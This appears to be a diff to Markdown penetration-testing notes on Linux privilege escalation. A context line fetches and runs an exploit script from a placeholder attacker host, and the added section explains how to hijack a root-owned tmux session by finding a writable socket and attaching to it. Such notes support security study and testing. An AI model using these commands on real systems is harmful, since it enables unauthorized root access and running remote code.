@@ -57,3 +57,44 @@ cd /dev/shm && curl --silent --location --request GET 'http://<ATTACKER_IP>/expl
 ```bash
 bash exploit.bash
 ```
+
+---
+
+#### *Tmux*
+
+> ***More information about TMUX [[TMUX|here]]***
+
+##### *Hijacking TMUX Sessions*
+
+Once we start our enumeration to find out a way to *privesc*, we reach the point where we list the running processes on the system
+
+```bash
+ps -faux
+```
+
+We take a look and see that there is a *TMUX* session running as *ROOT* or another privileged user
+
+According to this, we know that sysadmins might be used to using *TMUX* on this server
+
+If so, we can examine this further by running the following filter commands
+
+```bash
+pgrep --full --list-full -- 'tmux'
+ps -faux | grep -i --color=always -- 'tmux'
+```
+
+Once we know that there is at least on active *TMUX* session on the server, we must look for the existing sockets related to the sessions
+
+Bear in mind that any user that has *read* and *write* privileges on a *TMUX* socket can create or attach an existing *TMUX* server session via the socket
+
+Therefore, we could proceed as follows to search for any *TMUX* socket for which the current user has write permissions
+
+```bash
+find / -path '*tmux*' -type s -writable 2> /dev/null
+```
+
+Then, we can attach to the existing session, which is running as *Root* or any other privileged user, by issuing the following command
+
+```bash
+tmux -S <SOCKET> a
+```
